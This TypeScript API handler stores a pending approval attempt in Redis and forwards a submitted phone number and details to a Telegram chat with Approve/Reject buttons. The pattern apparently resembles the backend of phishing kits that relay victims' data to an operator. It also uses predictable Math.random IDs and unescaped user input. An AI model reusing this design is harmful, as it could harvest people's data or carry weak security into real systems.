type ApiRequest = {
    method?: string;
    body?: unknown;
};

type ApiResponse = {
    status: (code: number) => ApiResponse;
    json: (body: unknown) => void;
    send: (body: string) => void;
};

const redisCommand = async (command: string) => {
    const url = process.env.UPSTASH_REDIS_REST_URL?.replace(/\/+$/, "");
    const token = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!url || !token) {
        throw new Error("UPSTASH_REDIS_REST_URL / UPSTASH_REDIS_REST_TOKEN are not configured");
    }

    const response = await fetch(`${url}${command}`, {
        headers: { Authorization: `Bearer ${token}` },
    });
    const payload = await response.json();

    if (payload.error) {
        throw new Error(`Upstash error: ${payload.error}`);
    }

    return payload.result;
};

export default async function handler(req: ApiRequest, res: ApiResponse) {
    if (req.method !== "POST") {
        return res.status(405).send("Method Not Allowed");
    }

    try {
        const body = (typeof req.body === "string" ? JSON.parse(req.body) : req.body || {}) as {
            type?: string;
            phone?: string;
            details?: string;
        };

        if (!body.phone) {
            return res.status(400).json({ success: false, message: "Phone number is required" });
        }

        const attemptId = Math.random().toString(36).substring(2, 15);
        await redisCommand(`/set/attempt:${attemptId}/pending/EX/300`);

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (botToken && chatId) {
            const message = `🔔 *New Approval Request*\n\n*Type:* ${body.type}\n*Phone:* ${body.phone}\n*Details:* ${body.details}\n\n*Attempt ID:* \`${attemptId}\``;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: `approve_${attemptId}` },
                                { text: "❌ Reject", callback_data: `reject_${attemptId}` },
                            ],
                        ],
                    },
                }),
            });
        } else {
            console.warn("TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not configured — skipping notification");
        }

        return res.status(200).json({ success: true, attemptId });
    } catch (error) {
        console.error("Callback error:", error);
        return res.status(500).json({ success: false, message: "Internal Server Error" });
    }
}
